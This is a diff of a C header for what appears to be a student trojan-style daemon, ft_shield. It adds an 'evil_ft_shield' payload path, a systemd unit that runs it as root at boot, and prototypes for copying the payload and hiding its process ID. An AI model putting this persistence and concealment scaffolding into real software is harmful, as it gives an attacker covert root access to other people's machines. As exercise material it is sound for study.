@@ -20,6 +20,7 @@
 #include <time.h>
 #include <string.h>
 #include <oath.h>
+#include <sys/sendfile.h>
 
 
 #define	sock_in		struct sockaddr_in
@@ -27,9 +28,30 @@
 #define	poll_fd		struct pollfd
 #define LOCK_FILE "/var/lock/matt_daemon.lock"
 // #define LOCK_FILE "/Users/cx02938/Desktop/matt_daemon.lock"
+// Log file
 #define LOG_PATH  "/var/log/"
 #define LOG_NAME  "ft_shield.log"
 #define LOG_FILE  LOG_PATH LOG_NAME
+// executable
+#define EXECUTABLE_NAME "evil_ft_shield"
+#define EXECUTABLE_PATH "/var/tmp/" // TODO poner la ubicación final
+#define EXECUTABLE_FILE EXECUTABLE_PATH EXECUTABLE_NAME
+// system init
+#define SYSTEMD_NAME "ft_shield.service"
+#define SYSTEMD_PATH "/etc/systemd/system/"
+#define SYSTEMD_FILE SYSTEMD_PATH SYSTEMD_NAME
+#define INI_CONTENT "[Unit]\n" \
+"Description=FT Shield Program\n" \
+"After=network.target\n" \
+"\n" \
+"[Service]\n" \
+"ExecStart=/var/tmp/evil_ft_shield\n" \
+"Restart=on-failure\n" \
+"User=root\n" \
+"\n" \
+"[Install]\n" \
+"WantedBy=multi-user.target\n"
+// socket stuff
 #define MAX_CLIENTS 3
 #define MSG_SIZE	512
 #define DEFAULT_PORT 4242
@@ -48,6 +70,9 @@ t_daemon    *create_daemon( void );
 void        init_socket_struct(t_daemon *daemon);
 bool        init_server(t_daemon *daemon);
 void        ft_daemonize(void);
+void        copy_payload(char *curdir);
+void        startup_setup(void);
+void        hide_pid(void);
 void        create_lock_file(t_daemon *daemon);
 void        init_pollfd(t_daemon *daemon);
 void        server_listen(t_daemon *daemon);
